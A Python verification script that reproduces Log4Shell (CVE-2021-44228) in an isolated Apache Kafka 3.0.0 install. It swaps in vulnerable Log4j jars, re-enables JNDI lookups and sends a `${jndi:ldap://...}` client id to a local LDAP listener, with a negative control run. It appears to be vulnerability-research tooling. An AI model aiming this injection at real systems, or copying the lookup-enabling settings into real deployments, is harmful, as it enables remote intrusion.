#!/usr/bin/env python3
import argparse
import hashlib
import json
import os
import signal
import shutil
import socket
import subprocess
import tarfile
import threading
import time
import zipfile
from pathlib import Path


SAMPLE_ID = "CVE-2021-44228__apache_kafka_3_0_0_v1_log4j_real_entrypoint"
ROOT = Path("/data/lhq/workspace/ljl-v1-downstream-insertions")
LEGACY_ROOT = Path("/data/lhq/workspace/ljl-strict-redo")
SOURCE_CASE = "log4j/CVE-2021-44228"
SOURCE_V1 = Path("/data/lhq/workspace/ljl-patch-java30-projects/input/log4j/CVE-2021-44228/v1")
M2 = Path("/data/lhq/workspace/ljl-patch-java30-projects/.m2-poc")
ARCHIVE = LEGACY_ROOT / "historical-scan" / "kafka" / "kafka_2.13-3.0.0.tgz"
FALLBACK_ARCHIVE = LEGACY_ROOT / "historical-scan" / "kafka_2.13-3.0.0.tgz"
LOG4J_CACHE = LEGACY_ROOT / "historical-scan" / "maven-log4j-2.14.1"
BASE = ROOT / "samples" / SAMPLE_ID / "evidence"
JAVA8_HOME = Path("/data/lhq/.sdkman/candidates/java/8.0.452-amzn")
LDAP_BIND_RESPONSE = bytes([48, 12, 2, 1, 1, 101, 7, 10, 1, 0, 4, 0, 4, 0])

LOG4J_JARS = {
    "log4j-api-2.14.1.jar": M2 / "org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar",
    "log4j-core-2.14.1.jar": M2 / "org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar",
    "log4j-slf4j-impl-2.14.1.jar": LOG4J_CACHE / "log4j-slf4j-impl-2.14.1.jar",
}


def sha256(path):
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def is_under(path, parent):
    try:
        path.relative_to(parent)
        return True
    except ValueError:
        return False


def start_ldap(case_name, timeout=25):
    received = []
    ready = threading.Event()
    port_box = {}

    def worker():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", 0))
            sock.listen(5)
            sock.settimeout(timeout)
            port_box["port"] = sock.getsockname()[1]
            (BASE / f"{case_name}-ldap-port.txt").write_text(
                str(port_box["port"]) + "\n", encoding="utf-8"
            )
            ready.set()
            try:
                conn, addr = sock.accept()
            except socket.timeout:
                return
            with conn:
                data = conn.recv(256)
                received.append(
                    {"addr": repr(addr), "data_hex": data.hex(), "data_repr": repr(data)}
                )
                try:
                    conn.sendall(LDAP_BIND_RESPONSE)
                except OSError:
                    pass

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    if not ready.wait(3):
        raise RuntimeError(f"LDAP listener did not start for {case_name}")
    return port_box["port"], received, thread


def inspect_log4j_core(jar_path):
    result = {
        "path": str(jar_path),
        "exists": jar_path.exists(),
        "JndiLookup.class": False,
        "JndiManager.class": False,
        "version_2_14_1": False,
    }
    if not jar_path.exists():
        return result
    with zipfile.ZipFile(jar_path) as zf:
        names = set(zf.namelist())
        result["JndiLookup.class"] = "org/apache/logging/log4j/core/lookup/JndiLookup.class" in names
        result["JndiManager.class"] = "org/apache/logging/log4j/core/net/JndiManager.class" in names
        props = "META-INF/maven/org.apache.logging.log4j/log4j-core/pom.properties"
        if props in names:
            result["version_2_14_1"] = "version=2.14.1" in zf.read(props).decode(
                "utf-8", "replace"
            )
    return result


def archive_path():
    if ARCHIVE.exists():
        return ARCHIVE
    return FALLBACK_ARCHIVE


def prep_runtime(case_name):
    run_root = BASE / f"{case_name}-runtime"
    if run_root.exists():
        shutil.rmtree(run_root)
    run_root.mkdir(parents=True)
    archive = archive_path()
    if not archive.exists():
        raise FileNotFoundError(archive)
    with tarfile.open(archive, "r:gz") as tar:
        tar.extractall(run_root)

    dist = run_root / "kafka_2.13-3.0.0"
    lib = dist / "libs"
    before = sorted(p.name for p in lib.glob("*.jar"))
    removed = []
    for pattern in ("slf4j-log4j12-*.jar", "log4j-1.2*.jar"):
        for jar in lib.glob(pattern):
            removed.append(jar.name)
            jar.unlink()

    copied = {}
    for name, source in LOG4J_JARS.items():
        if not source.exists():
            raise FileNotFoundError(source)
        target = lib / name
        shutil.copy2(source, target)
        copied[name] = {
            "source": str(source),
            "target": str(target),
            "sha256_source": sha256(source),
            "sha256_target": sha256(target),
            "is_generated_v1_runtime_jar": is_under(source, M2),
            "is_bridge_adapter": name == "log4j-slf4j-impl-2.14.1.jar",
        }

    conf = dist / "config" / "log4j2.xml"
    conf.write_text(
        '<Configuration status="WARN">\n'
        '  <Appenders><Console name="Console" target="SYSTEM_OUT">'
        '<PatternLayout pattern="%d %-5p %c - %m%n"/>'
        "</Console></Appenders>\n"
        '  <Loggers><Logger name="org.apache.kafka" level="DEBUG"/>'
        '<Root level="INFO"><AppenderRef ref="Console"/></Root></Loggers>\n'
        "</Configuration>\n",
        encoding="utf-8",
    )
    for script in (dist / "bin").glob("*.sh"):
        script.chmod(script.stat().st_mode | 0o111)

    after = sorted(p.name for p in lib.glob("*.jar"))
    return dist, {
        "archive": str(archive),
        "before": before,
        "removed": sorted(removed),
        "copied": copied,
        "after": after,
        "log4j2_config": str(conf),
    }


def run_kafka_case(case_name, expect_callback):
    dist, replacement = prep_runtime(case_name)
    port, received, thread = start_ldap(case_name)
    client_id = (
        "${jndi:ldap://127.0.0.1:%d/a}" % port
        if expect_callback
        else "strict-control-no-jndi"
    )
    props = BASE / f"{case_name}.properties"
    props.write_text(
        f"client.id={client_id}\n"
        "request.timeout.ms=1500\n"
        "default.api.timeout.ms=2000\n",
        encoding="utf-8",
    )
    out_path = BASE / f"{case_name}-kafka.log"
    cmd = [
        str(dist / "bin" / "kafka-topics.sh"),
        "--bootstrap-server",
        "127.0.0.1:1",
        "--command-config",
        str(props),
        "--list",
    ]
    env = os.environ.copy()
    env["JAVA_TOOL_OPTIONS"] = ""
    env["KAFKA_LOG4J_OPTS"] = (
        "-Dlog4j.configurationFile="
        + str(dist / "config" / "log4j2.xml")
        + " -Dlog4j2.formatMsgNoLookups=false"
        + " -Dcom.sun.jndi.ldap.object.trustURLCodebase=true"
    )
    if JAVA8_HOME.exists():
        env["JAVA_HOME"] = str(JAVA8_HOME)

    started = time.time()
    proc = subprocess.Popen(
        cmd,
        cwd=str(dist),
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        start_new_session=True,
    )
    timed_out = False
    try:
        output, _ = proc.communicate(timeout=25)
    except subprocess.TimeoutExpired:
        timed_out = True
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except ProcessLookupError:
            pass
        output, _ = proc.communicate(timeout=5)
    thread.join(4)
    out_path.write_text(output, encoding="utf-8")
    return {
        "case": case_name,
        "cmd": cmd,
        "duration_seconds": round(time.time() - started, 3),
        "runtime": str(dist),
        "command_config": str(props),
        "client_id": client_id,
        "listener_port": port,
        "listener_received": received,
        "listener_received_count": len(received),
        "returncode": proc.returncode,
        "timed_out": timed_out,
        "replacement": replacement,
        "output_file": str(out_path),
        "output_contains_client_id": client_id in output,
        "output_contains_adminclient_client_id": f"AdminClient clientId={client_id}" in output,
        "output_contains_log4j_slf4j_stack": "org.apache.logging.slf4j.Log4jLogger" in output,
        "stdout_tail": output[-10000:],
    }


def main():
    global ROOT, BASE
    parser = argparse.ArgumentParser()
    parser.add_argument("--workdir", default=str(ROOT))
    parser.add_argument("--fresh", action="store_true")
    args = parser.parse_args()

    ROOT = Path(args.workdir)
    sample_dir = ROOT / "samples" / SAMPLE_ID
    if args.fresh and sample_dir.exists():
        shutil.rmtree(sample_dir)
    BASE = sample_dir / "evidence"
    BASE.mkdir(parents=True, exist_ok=True)

    positive = run_kafka_case("positive_client_id_jndi", expect_callback=True)
    negative = run_kafka_case("negative_client_id_control", expect_callback=False)

    core_target = Path(positive["replacement"]["copied"]["log4j-core-2.14.1.jar"]["target"])
    core_inspection = inspect_log4j_core(core_target)
    dep_evidence = {
        "artifact": str(archive_path()),
        "source_case": SOURCE_CASE,
        "source_v1": str(SOURCE_V1),
        "insertion_model": (
            "isolated runtime dependency insertion: official Apache Kafka 3.0.0 binary with "
            "the original SLF4J Log4j 1.x backend jars removed, generated v1 Log4j 2.14.1 "
            "api/core jars copied from .m2-poc into libs, and log4j-slf4j-impl copied only "
            "as the SLF4J bridge so Kafka's own logging reaches the inserted v1 Log4j2 core"
        ),
        "positive_runtime_replacement": positive["replacement"],
        "negative_runtime_replacement": negative["replacement"],
        "log4j_core": core_inspection,
    }
    (BASE / "dependency-evidence.json").write_text(
        json.dumps(dep_evidence, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )

    confirmed = (
        positive["returncode"] == 1
        and positive["output_contains_client_id"]
        and positive["output_contains_adminclient_client_id"]
        and positive["output_contains_log4j_slf4j_stack"]
        and positive["listener_received_count"] > 0
        and negative["returncode"] == 1
        and negative["output_contains_client_id"]
        and negative["output_contains_adminclient_client_id"]
        and negative["listener_received_count"] == 0
        and "slf4j-log4j12-1.7.30.jar" in positive["replacement"]["removed"]
        and "log4j-1.2.17.jar" in positive["replacement"]["removed"]
        and core_inspection["JndiLookup.class"]
        and core_inspection["JndiManager.class"]
    )

    result = {
        "sample_id": SAMPLE_ID,
        "status": "TP_CONFIRMED_REAL_DOWNSTREAM_ENTRYPOINT" if confirmed else "FAILED",
        "strict_status": "TP_CONFIRMED" if confirmed else "FAILED",
        "source_case": SOURCE_CASE,
        "source_v1_path": str(SOURCE_V1),
        "cve": "CVE-2021-44228",
        "downstream_repo": "apache/kafka",
        "downstream_application": "Apache Kafka 3.0.0",
        "downstream_entrypoint": "bin/kafka-topics.sh real AdminClient CLI",
        "downstream": "Apache Kafka 3.0.0",
        "upstream_library": "log4j",
        "vulnerable_version": "2.14.1",
        "artifact": str(archive_path()),
        "insertion_model": dep_evidence["insertion_model"],
        "attack_surface": (
            "Kafka CLI `bin/kafka-topics.sh --bootstrap-server ... --command-config ... --list`; "
            "user-controlled `client.id` is logged by KafkaAdminClient through Kafka's SLF4J logging"
        ),
        "positive": {
            "returncode": positive["returncode"],
            "payload_logged": positive["output_contains_client_id"],
            "adminclient_client_id_logged": positive["output_contains_adminclient_client_id"],
            "log4j_slf4j_stack_observed": positive["output_contains_log4j_slf4j_stack"],
            "listener_received_count": positive["listener_received_count"],
            "listener_received": positive["listener_received"],
        },
        "negative": {
            "returncode": negative["returncode"],
            "control_logged": negative["output_contains_client_id"],
            "adminclient_client_id_logged": negative["output_contains_adminclient_client_id"],
            "listener_received_count": negative["listener_received_count"],
        },
        "dependency_evidence": dep_evidence,
        "dependency_evidence_file": str(BASE / "dependency-evidence.json"),
        "dynamic_evidence": str(BASE / "probe.json"),
        "run_rc": str(BASE / "run.rc"),
        "verifier": str(ROOT / "scripts" / "verify_kafka_log4j_v1_inserted.py"),
        "not_cve_poc_local": True,
        "not_runner_only": True,
        "notes": (
            "The verifier does not execute .cve_poc_local. It inserts the generated v1 Log4j "
            "api/core 2.14.1 runtime jars into an isolated Kafka distribution, bridges Kafka's "
            "SLF4J logs into Log4j2, and triggers Log4Shell through Kafka's real AdminClient CLI "
            "logging path. The positive run receives an LDAP bind; the negative control receives none."
        ),
        "cases": [positive, negative],
    }

    (sample_dir / "manifest.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    (BASE / "probe.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    listener_hex = ""
    if positive["listener_received"]:
        listener_hex = positive["listener_received"][0].get("data_hex", "")
    (BASE / "run.rc").write_text(
        f"RUN_RC={0 if confirmed else 1}\n"
        f"status={result['strict_status']}\n"
        f"positive_returncode={positive['returncode']}\n"
        f"positive_payload_logged={int(positive['output_contains_client_id'])}\n"
        f"positive_adminclient_client_id_logged={int(positive['output_contains_adminclient_client_id'])}\n"
        f"positive_log4j_slf4j_stack_observed={int(positive['output_contains_log4j_slf4j_stack'])}\n"
        f"positive_listener_received_count={positive['listener_received_count']}\n"
        f"listener_data_hex={listener_hex}\n"
        f"negative_returncode={negative['returncode']}\n"
        f"negative_control_logged={int(negative['output_contains_client_id'])}\n"
        f"negative_adminclient_client_id_logged={int(negative['output_contains_adminclient_client_id'])}\n"
        f"negative_listener_received_count={negative['listener_received_count']}\n"
        f"jndi_lookup_class_present={int(core_inspection['JndiLookup.class'])}\n"
        f"jndi_manager_class_present={int(core_inspection['JndiManager.class'])}\n",
        encoding="utf-8",
    )
    (sample_dir / "README.md").write_text(
        f"# {SAMPLE_ID}\n\n"
        "This is a strict insertion sample. The verifier unpacks the official Apache Kafka 3.0.0 "
        "binary into an isolated runtime, removes the original SLF4J Log4j 1.x backend, and copies "
        "Log4j 2.14.1 `api` and `core` jars from `log4j/CVE-2021-44228/v1/.m2-poc` into `libs`. "
        "`log4j-slf4j-impl` is an auxiliary bridge so Kafka's own SLF4J logging reaches the inserted "
        "v1 Log4j2 runtime.\n\n"
        "The positive run executes `bin/kafka-topics.sh --bootstrap-server 127.0.0.1:1 "
        "--command-config <props> --list` with `client.id=${jndi:ldap://127.0.0.1:<port>/a}`. "
        "KafkaAdminClient logs the client id through the real CLI path and the local LDAP listener "
        "receives the Log4j JNDI lookup. The negative run uses the same path with a non-JNDI "
        "control string and receives no callback.\n\n"
        "Run: `python3 scripts/verify_kafka_log4j_v1_inserted.py --fresh` from "
        "`/data/lhq/workspace/ljl-v1-downstream-insertions`.\n",
        encoding="utf-8",
    )

    print(json.dumps(result, indent=2, sort_keys=True))
    raise SystemExit(0 if confirmed else 1)


if __name__ == "__main__":
    main()
